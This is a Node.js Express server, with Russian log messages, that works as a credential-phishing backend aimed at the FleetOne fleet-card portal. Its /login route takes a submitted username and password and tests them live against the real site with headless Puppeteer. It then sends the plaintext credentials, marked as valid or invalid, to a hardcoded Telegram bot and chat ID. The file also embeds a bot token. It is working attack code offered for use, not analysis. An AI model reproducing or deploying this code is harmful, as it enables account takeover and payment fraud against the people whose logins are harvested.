process.env.PLAYWRIGHT_BROWSERS_PATH = "0";

const express = require("express");
const puppeteer = require("puppeteer-core");
const { executablePath } = require("@sparticuz/chromium");

const cors = require("cors");
const fetch = require("node-fetch");

const app = express();
const port = 8080;
app.use(cors());

const TELEGRAM_BOT_TOKEN = "8028378156:AAFzr5FzJtK7H3wo1ResfDt4IhFaYX9k6OM";
const CHAT_ID = 531918242;

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE");
  res.header("Access-Control-Allow-Headers", "Content-Type, Authorization");
  next();
});

app.options("*", (req, res) => {
  res.sendStatus(200);
});

app.use(express.json());

app.get("/", (req, res) => {
  res.send("Hello");
});

app.post("/login", async (req, res) => {
  const startTotal = Date.now();
  console.log("Получен POST-запрос на /login:", req.body);

  const { username, password } = req.body;
  if (!username || !password) {
    return res.status(400).json({ error: "Missing username or password" });
  }

  console.log("Запускаем Puppeteer...");
  const startBrowser = Date.now();
  const browser = await puppeteer.launch({
    headless: true,
    executablePath: await executablePath(),
    args: ["--no-sandbox", "--disable-setuid-sandbox"],
  });
  console.log(`✅ Puppeteer запущен за ${Date.now() - startBrowser} мс`);

  const page = await browser.newPage();
  await page.setUserAgent(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
  );

  try {
    console.log("Переход на страницу логина...");
    const startNav = Date.now();
    await page.goto("https://manage.fleetone.com/security/fleetOneLogin", {
      waitUntil: "networkidle2",
    });
    console.log(`✅ Страница загружена за ${Date.now() - startNav} мс`);

    console.log("Ввод логина и пароля...");
    await page.evaluate(
      (username, password) => {
        document.querySelector('input[name="userId"]').value = username;
        document.querySelector('input[name="password"]').value = password;
        document.querySelector("form").submit();
      },
      username,
      password
    );

    console.log("Ожидание авторизации...");
    const startLogin = Date.now();
    await page.waitForNavigation({ waitUntil: "networkidle0", timeout: 8000 });
    console.log(`✅ Авторизация завершена за ${Date.now() - startLogin} мс`);

    const cookies = await page.cookies();
    const isLoggedIn = cookies.some((cookie) => cookie.name === "JSESSIONID");

    await browser.close();

    if (!isLoggedIn) {
      console.log("❌ Ошибка входа");
      await sendTelegramMessage(
        `❌ Ошибка входа\n👤 ${username}\n🔑 ${password}`
      );
      return res.json({ success: false, message: "Invalid credentials" });
    }

    console.log("✅ Успешный вход");
    await sendTelegramMessage(
      `✅ Успешный вход\n👤 ${username}\n🔑 ${password}`
    );

    console.log(`⏳ Общее время: ${Date.now() - startTotal} мс`);
    return res.json({ success: true, message: "Login successful", username });
  } catch (error) {
    await browser.close();
    return res
      .status(500)
      .json({ error: "Login process failed", details: error.message });
  }
});

async function sendTelegramMessage(text) {
  try {
    await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text }),
      }
    );
  } catch (error) {
    console.error("Error sending Telegram message:", error);
  }
}

app.listen(port, () => {
  console.log(`Backend server is running at http://localhost:${port}`);
});

module.exports = app;
